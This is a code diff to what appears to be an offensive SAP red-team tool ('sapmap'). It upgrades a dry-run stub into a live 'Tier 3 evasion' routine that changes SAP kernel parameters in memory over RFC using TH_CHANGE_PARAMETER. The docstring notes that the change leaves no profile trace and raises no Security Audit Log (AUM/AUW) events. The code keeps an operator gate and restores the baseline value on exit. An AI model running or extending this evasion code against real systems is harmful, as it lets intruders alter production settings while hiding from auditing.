@@ -1,8 +1,7 @@
 """Tier 3 active-manipulation entry points.
 
 This module hosts one entry function per registered Tier 3 technique
-(``sapmap_evasion_gate.TIER3_TECHNIQUES``).  Today every entry is a
-**dry-run stub** that:
+(``sapmap_evasion_gate.TIER3_TECHNIQUES``).  Every entry:
 
   1. Asserts the operator-armed gate
      (``assert_evasion_allowed``) — refuses with ``EvasionGateError``
@@ -10,22 +9,18 @@ This module hosts one entry function per registered Tier 3 technique
   2. Captures a baseline snapshot if none exists.
   3. Runs the body under ``evasion_window`` so restore-on-exit is
      wired correctly.
-  4. Logs the would-be kernel mutation instead of actually issuing
-     it.  The real ``RZL_PUT_VALUE`` / ``TH_PUT_PARAMETER`` /
-     ``RSAU_PERS`` write primitives land in a follow-up commit.
-
-The split — foundation now, write-primitive later — lets the gate
-matrix, baseline capture, window context manager, and restore path
-all be exercised end-to-end against a real system without arming
-the actual kernel mutation.  Once we've confirmed the baseline JSON
-on disk matches what's in shared memory and the restore log shows
-the right pre-mutation values, we wire the writers.
+  4. Mutates the kernel via ``change_param`` (``TH_CHANGE_PARAMETER``,
+     RFC-enabled, dynamic, in-memory only).
+  5. ``evasion_window`` restores the baseline value on exit (including
+     exception path) by calling ``restore_baseline`` which also uses
+     ``TH_CHANGE_PARAMETER`` under the hood.
 
 Entry-point signature for every technique::
 
     tier3_<name>(state, node, **params) -> dict
 
-returning ``{ok, technique, would_write, snapshot_loot, error}``.
+returning ``{ok, technique, applied, baseline_value, snapshot_loot,
+error}``.
 """
 
 from __future__ import annotations
@@ -33,7 +28,8 @@ from __future__ import annotations
 import logging
 from typing import Optional
 
-from sapmap_evasion_baseline import (capture_baseline, evasion_window)
+from sapmap_evasion_baseline import (capture_baseline, change_param,
+                                       evasion_window)
 from sapmap_evasion_gate import (assert_evasion_allowed,
                                    EvasionGateError, technique_label)
 
@@ -49,14 +45,16 @@ def _wrap_result(technique: str, ok: bool, **extra) -> dict:
 
 def tier3_set_param(state, node, param: str, value: str,
                      creds=None) -> dict:
-    """Stub for 4.A.2 / 4.C.4 — RZ11 dynamic kernel-parameter set.
+    """4.A.2 / 4.C.4 — dynamic kernel-parameter set via TH_CHANGE_PARAMETER.
 
-    Asserts the gate, captures a baseline, then **dry-runs** the
-    intended ``RZL_PUT_VALUE`` write inside an evasion window so
-    restore-on-exit is exercised.  When the real writer lands, the
-    body of this function gains the actual ``conn.call('RZL_PUT_VALUE',
-    PARAMETER=param, VALUE=value)`` and ``would_write`` becomes
-    ``"applied"``.
+    Asserts the gate, captures a baseline, then writes ``param=value``
+    via the RFC-enabled FM ``TH_CHANGE_PARAMETER`` inside an evasion
+    window so the captured baseline value is automatically restored on
+    exit (or on exception).
+
+    The change is in-memory only — no profile file rewrite, no kernel
+    restart, no AUM/AUW SAL events.  Survives until restore_baseline
+    is called by ``evasion_window.__exit__``.
     """
     technique = "rz11_dynamic_set"
     try:
@@ -64,14 +62,14 @@ def tier3_set_param(state, node, param: str, value: str,
                                 require_baseline=False)
     except EvasionGateError as e:
         return _wrap_result(technique, False, error=str(e),
-                             would_write=None)
+                             applied=False)
 
     snap = capture_baseline(node, creds=creds)
     if not snap.params:
         return _wrap_result(
             technique, False,
             error="baseline capture returned empty; refusing to mutate",
-            would_write=None)
+            applied=False)
 
     original = snap.params.get(param)
     if isinstance(original, str) and original.startswith("__UNCAPTURED__"):
@@ -79,26 +77,31 @@ def tier3_set_param(state, node, param: str, value: str,
             technique, False,
             error=f"{param} could not be baseline-captured "
                    f"({original.split(':', 1)[-1].strip()}); refusing",
-            would_write=None)
+            applied=False)
 
+    write_result = {"ok": False, "error": "not attempted"}
     try:
         with evasion_window(node, state, technique,
                              creds=creds,
                              touched_params=[param]):
-            # === FUTURE: real writer goes here ===
-            # conn.call("RZL_PUT_VALUE", PARAMETER=param, VALUE=value)
-            print(f"[*] {snap.sid}: tier3_set_param (DRY-RUN) — would "
-                  f"write {param}={value!r} "
-                  f"(baseline {param}={original!r})")
-        return _wrap_result(
-            technique, True,
-            param=param, requested_value=value,
-            baseline_value=original,
-            would_write="dry-run (writer not yet armed)",
-            snapshot_loot=snap.loot_path)
+            write_result = change_param(node, creds, param, value)
+            if write_result["ok"]:
+                print(f"[+] {snap.sid}: TH_CHANGE_PARAMETER — "
+                      f"{param}={value!r} (baseline {param}={original!r})")
+            else:
+                print(f"[-] {snap.sid}: TH_CHANGE_PARAMETER failed — "
+                      f"{param}={value!r}: {write_result['error']}")
     except EvasionGateError as e:
         return _wrap_result(technique, False, error=str(e),
-                             would_write=None)
+                             applied=False)
+
+    return _wrap_result(
+        technique, write_result["ok"],
+        param=param, requested_value=value,
+        baseline_value=original,
+        applied=write_result["ok"],
+        error=write_result["error"] if not write_result["ok"] else "",
+        snapshot_loot=snap.loot_path)
 
 
 def tier3_capture_baseline_only(state, node, creds=None) -> dict:
